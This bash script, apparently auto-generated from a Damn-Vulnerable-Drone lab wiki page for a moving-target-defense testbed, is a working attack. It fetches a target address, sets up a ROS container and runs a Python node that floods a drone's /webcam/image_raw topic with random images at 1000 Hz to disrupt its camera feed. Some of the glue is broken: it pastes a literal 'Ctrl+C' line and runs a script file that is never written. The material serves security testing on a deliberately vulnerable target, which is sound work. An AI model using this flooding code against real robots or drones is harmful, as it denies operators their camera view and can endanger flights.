#!/usr/bin/env bash
# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Camera-Feed-ROS-Topic-Flooding.md
# Created: 2025-09-14 13:46:03
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.

# MTD_INTERFACE_START
# ==========================================================
# MTD-aware Target Acquisition
# This block dynamically queries the MTD interface for an active target.
# ==========================================================
echo "INFO: Querying MTD interface for active target..."

# --- Project Root Resolution ---
# 1. 현재 실행되는 쉘 스크립트의 실제 위치를 찾습니다.
SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
# 2. 'dvd_lite' 폴더를 포함하는 프로젝트 루트 디렉토리를 찾습니다. (현재 위치에서 4단계 위)
PROJECT_ROOT=$(realpath "$SCRIPT_DIR/../../../../")
# -----------------------------

# PYTHONPATH 환경 변수 대신, 직접 프로젝트 루트로 이동하여 파이썬 모듈을 실행합니다.
# 이 방식은 'sudo'가 환경 변수를 초기화하는 문제를 우회할 수 있어 더 안정적입니다.
pushd "$PROJECT_ROOT" > /dev/null
TARGET_ADDR=$(python3 -m dvd_lite.dvd_attacks_lpc.interface)
popd > /dev/null

if [ $? -ne 0 ] || [ -z "$TARGET_ADDR" ]; then
    echo "ERROR: Could not get active target from MTD interface. Aborting attack."
    exit 1
fi

# 콜론을 기준으로 IP와 PORT를 분리하여 변수에 저장합니다.
TARGET_IP=$(echo $TARGET_ADDR | cut -d: -f1)
TARGET_PORT=$(echo $TARGET_ADDR | cut -d: -f2)

echo "INFO: Active target acquired -> ${TARGET_IP}:${TARGET_PORT}"
# MTD_INTERFACE_END

set -euo pipefail

# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
fi

log "[ATTACK] id=camera-feed-ros-topic-flooding src=Camera-Feed-ROS-Topic-Flooding.md"
log "[BLOCK 1] type=shell"
sudo docker pull ros:noetic-ros-base

log "[BLOCK 2] type=shell"
docker run -it --network=simulator --ip=10.13.0.10 --name ros_noetic_container ros:noetic-ros-base bash

log "[BLOCK 3] type=shell"
export ROS_MASTER_URI=http://${TARGET_IP}:${TARGET_PORT}
export ROS_IP=10.13.0.10
source /opt/ros/noetic/setup.bash

log "[BLOCK 4] type=python"
python3 - <<'PY'
# --- argv glue for converter ---
import os, sys, re
if len(sys.argv) <= 1:
    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:${TARGET_IP}:${TARGET_PORT}')
    if ep.startswith('udp:'):
        try:
            _, rest = ep.split(':', 1)
            ep = rest
        except ValueError:
            pass
    # expect ip:port
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
        sys.argv = [sys.argv[0], ep]
#!/usr/bin/env python3

import rospy
from sensor_msgs.msg import Image
import numpy as np

def flood_topic():
    rospy.init_node('image_flooder', anonymous=True)
    pub = rospy.Publisher('/webcam/image_raw', Image, queue_size=10)
    rate = rospy.Rate(1000)  # 1000 Hz flooding

    while not rospy.is_shutdown():
        img = Image()
        img.height = 480
        img.width = 640
        img.encoding = "rgb8"
        img.is_bigendian = 0
        img.step = img.width * 3
        img.data = np.random.bytes(img.step * img.height)
        pub.publish(img)
        rate.sleep()

if __name__ == '__main__':
    try:
        flood_topic()
    except rospy.ROSInterruptException:
        pass
PY

log "[BLOCK 5] type=shell"
python3 ros-topic-flood.py

log "[BLOCK 6] type=shell"
Ctrl+C

